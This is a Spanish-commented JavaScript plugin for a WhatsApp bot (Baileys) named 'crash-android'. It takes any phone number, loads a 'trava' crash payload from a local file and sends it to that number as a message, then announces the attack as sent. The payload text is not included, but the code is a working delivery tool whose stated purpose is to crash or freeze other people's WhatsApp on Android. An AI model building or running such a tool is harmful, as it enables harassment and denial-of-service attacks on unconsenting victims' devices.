import { jidDecode } from '@whiskeysockets/baileys'
import fs from 'fs'
import path from 'path'

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola'],
    category: 'tools',
    noPrefix: true,

    run: async (conn, m, { args, command }) => {
        // 1. Validación estricta del número
        if (!args[0]) {
            return m.reply(`✧ ‧₊˚ *MISA CRASH* ୧ֹ˖\n\n> ✐ *Uso:* ${command} [número]`)
        }

        try {
            // Limpiamos el número
            let num = args[0].replace(/[^0-9]/g, '')
            
            // SI EL NÚMERO QUEDA VACÍO DESPUÉS DE LIMPIAR, PARAMOS AQUÍ
            if (!num || num.length < 8) {
                return m.reply('❌ *El número es inválido o muy corto.*')
            }

            let targetJid = num + '@s.whatsapp.net'

            // 2. Ruta al archivo de texto (ola.js)
            const travaPath = path.join(process.cwd(), 'travas', 'ola.js')

            if (!fs.existsSync(travaPath)) {
                return m.reply('❌ No encontré el archivo `ola.js` en la carpeta `travas`.')
            }

            const contenido = fs.readFileSync(travaPath, 'utf-8')

            // 3. Verificación de JID antes de enviar (Para evitar el error de jidDecode)
            const decode = jidDecode(targetJid)
            if (!decode || !decode.user) {
                return m.reply('❌ *Error fatal:* El JID generado es inválido.')
            }

            // 4. Ejecución
            await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
            
            // Envío al objetivo
            await conn.sendMessage(targetJid, { text: contenido })

            await m.reply(`✅ *Ataque enviado a @${num}*`)

        } catch (err) {
            // Este catch evita que el bot se apague si algo sale mal
            console.error('Error controlado en Crash:', err)
            m.reply('⚠️ Hubo un error en el envío, pero el bot sigue vivo.')
        }
    }
}

export default crashAndroidMisa
